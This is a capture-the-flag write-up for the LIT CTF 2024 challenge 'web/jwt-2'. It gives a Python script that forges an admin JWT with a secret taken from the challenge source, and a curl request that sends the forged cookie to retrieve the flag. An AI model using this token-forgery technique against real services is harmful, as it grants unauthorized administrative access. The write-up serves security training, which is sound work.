# LIT CTF 2024: web/jwt-2
**Title:** web/jwt-2

**Description:** its like jwt-1 but this one is harder URL: [http://litctf.org:31777/](http://litctf.org:31777/).
## Solution:
This is the sequel of the challenge [jwt-1](https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/jwt-1/jwt-1.md), the description hints at manipulating JWT tokens to gain access to a protected resource. Here’s how we approached the problem:

### Step 1: Analyze the JWT Structure:
The JWT token consists of three parts:

1. **Header**: Contains metadata about the token.
2. **Payload**: Contains the actual data or claims.
3. **Signature**: Used to verify the integrity of the token.

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:** To gain access, we need to include an `admin` field set to `true` in the payload.

**Signature:** The signature is created using HMAC SHA256 with the secret key `"xook"`, according to [index.ts](https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/jwt-2/Files/index.ts) provided with this challenge.

### Step 2: Generate the JWT Token:
We need to craft a JWT with administrative privileges. Here’s the [Python script](https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/jwt-2/Files/jwt.py) used to generate a valid JWT:

```python
import json
import base64
import hmac
import hashlib

jwt_secret = 'xook'

header = {
    'alg': 'HS256',
    'typ': 'JWT'
}
jwt_header = base64.urlsafe_b64encode(json.dumps(header).encode('utf-8')).decode('utf-8').rstrip('=')

payload = {
    'name': 'testuserBITSAT',
    'admin': True
}
jwt_payload = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('=')

signature = hmac.new(jwt_secret.encode('utf-8'), f'{jwt_header}.{jwt_payload}'.encode('utf-8'), hashlib.sha256).digest()
jwt_signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')

token = f'{jwt_header}.{jwt_payload}.{jwt_signature}'

print('Generated JWT Token:', token)

print('Header:', jwt_header)
print('Payload:', jwt_payload)
print('Signature:', jwt_signature)
```

```
└─$ python3 jwt.py
Generated JWT Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJuYW1lIjogInRlc3R1c2VyQklUU0FUIiwgImFkbWluIjogdHJ1ZX0.vXlsW5vpjiI8nDkvhffewMY6XOXeTuiBRIB0CUhyz3Y
Header: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9
Payload: eyJuYW1lIjogInRlc3R1c2VyQklUU0FUIiwgImFkbWluIjogdHJ1ZX0
Signature: vXlsW5vpjiI8nDkvhffewMY6XOXeTuiBRIB0CUhyz3Y
```

### Step 3: Send the request with tampered JWT:
For this I used an online tool [Run Curl Commands Online (reqbin.com)](https://reqbin.com/curl) and sent the request:
```bash
curl "http://litctf.org:31777/flag" ^
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
  -H "Accept-Language: en-US,en;q=0.9,en-IN;q=0.8" ^
  -H "Connection: keep-alive" ^
  -H "Cookie: token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJuYW1lIjogInRlc3R1c2VyQklUU0FUIiwgImFkbWluIjogdHJ1ZX0.vXlsW5vpjiI8nDkvhffewMY6XOXeTuiBRIB0CUhyz3Y" ^
  -H "Referer: http://litctf.org:31777/" ^
  -H "Upgrade-Insecure-Requests: 1" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0" ^
  --insecure
```

And we get the flag as the response: `LITCTF{v3rifyed_thI3_Tlme_1re4DV9}`
